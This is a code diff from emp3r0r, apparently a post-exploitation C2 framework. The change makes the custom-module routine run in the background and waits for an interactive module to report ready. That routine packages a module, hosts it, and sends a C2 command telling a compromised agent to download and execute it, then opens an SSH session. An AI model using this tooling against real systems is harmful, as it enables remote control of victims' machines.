@@ -6,7 +6,9 @@ import (
 	"io/ioutil"
 	"strconv"
 	"strings"
+	"time"
 
+	"github.com/google/uuid"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -47,68 +49,84 @@ var ModuleConfigs = make(map[string]ModConfig, 1)
 
 // moduleCustom run a custom module
 func moduleCustom() {
-	start_sh := WWWRoot + CurrentMod + ".sh"
-	config, exists := ModuleConfigs[CurrentMod]
-	if !exists {
-		CliPrintError("Config of %s does not exist", CurrentMod)
-		return
-	}
-	for opt, val := range config.Options {
-		val[0] = Options[opt].Val
-	}
+	go func() {
+		start_sh := WWWRoot + CurrentMod + ".sh"
+		config, exists := ModuleConfigs[CurrentMod]
+		if !exists {
+			CliPrintError("Config of %s does not exist", CurrentMod)
+			return
+		}
+		for opt, val := range config.Options {
+			val[0] = Options[opt].Val
+		}
 
-	// most of the time, start.sh is the only file changing
-	// and it's very small, so we host it for agents to download
-	err = genStartScript(&config, start_sh)
-	if err != nil {
-		CliPrintError("Generating start.sh: %v", err)
-		return
-	}
-	if config.IsInteractive {
-		// empty out start.sh
-		// we will run the module as shell
-		err = ioutil.WriteFile(start_sh, []byte("echo emp3r0r-interactive-module"), 0600)
+		// most of the time, start.sh is the only file changing
+		// and it's very small, so we host it for agents to download
+		err = genStartScript(&config, start_sh)
 		if err != nil {
-			CliPrintError("write %s: %v", start_sh, err)
+			CliPrintError("Generating start.sh: %v", err)
 			return
 		}
-	}
-
-	// compress module files
-	tarball := WWWRoot + CurrentMod + ".tar.bz2"
-	err = util.TarBz2(ModuleDir+CurrentMod, tarball)
-	if err != nil {
-		CliPrintError("Compressing %s: %v", CurrentMod, err)
-		return
-	}
-
-	// tell agent to download and execute this module
-	checksum := tun.SHA256SumFile(tarball)
-	cmd := fmt.Sprintf("%s %s %s", emp3r0r_data.C2CmdCustomModule, CurrentMod, checksum)
-	err = SendCmdToCurrentTarget(cmd, "")
-	if err != nil {
-		CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
-	}
-
-	// interactive module
-	if config.IsInteractive {
-		opt, exits := config.Options["args"]
-		if !exits {
-			CliPrintError("Please include `args` in module config file")
-			return
+		if config.IsInteractive {
+			// empty out start.sh
+			// we will run the module as shell
+			err = ioutil.WriteFile(start_sh, []byte("echo emp3r0r-interactive-module\n"), 0600)
+			if err != nil {
+				CliPrintError("write %s: %v", start_sh, err)
+				return
+			}
 		}
-		args := opt[0]
-		port := strconv.Itoa(util.RandInt(1024, 65535))
 
-		// do it
-		err := SSHClient(fmt.Sprintf("%s/%s/%s",
-			emp3r0r_data.AgentRoot, CurrentMod, config.Exec),
-			args, port, false)
+		// compress module files
+		tarball := WWWRoot + CurrentMod + ".tar.bz2"
+		CliPrintInfo("Compressing %s with bz2...", CurrentMod)
+		err = util.TarBz2(ModuleDir+CurrentMod, tarball)
 		if err != nil {
-			CliPrintError("module %s: %v", config.Name, err)
+			CliPrintError("Compressing %s: %v", CurrentMod, err)
 			return
 		}
-	}
+
+		// tell agent to download and execute this module
+		checksum := tun.SHA256SumFile(tarball)
+		cmd := fmt.Sprintf("%s %s %s", emp3r0r_data.C2CmdCustomModule, CurrentMod, checksum)
+		cmd_id := uuid.NewString()
+		err = SendCmdToCurrentTarget(cmd, cmd_id)
+		if err != nil {
+			CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
+		}
+
+		// interactive module
+		if config.IsInteractive {
+			opt, exits := config.Options["args"]
+			if !exits {
+				CliPrintError("Please include `args` in module config file")
+				return
+			}
+			args := opt[0]
+			port := strconv.Itoa(util.RandInt(1024, 65535))
+
+			// wait until the module is ready
+			for i := 0; i < 10; i++ {
+				if strings.Contains(CmdResults[cmd_id], "emp3r0r-interactive-module") {
+					break
+				}
+				time.Sleep(time.Second)
+			}
+			if !strings.Contains(CmdResults[cmd_id], "emp3r0r-interactive-module") {
+				CliPrintError("%s failed to upload", CurrentMod)
+				return
+			}
+
+			// do it
+			err := SSHClient(fmt.Sprintf("%s/%s/%s",
+				emp3r0r_data.AgentRoot, CurrentMod, config.Exec),
+				args, port, false)
+			if err != nil {
+				CliPrintError("module %s: %v", config.Name, err)
+				return
+			}
+		}
+	}()
 }
 
 // Print module meta data
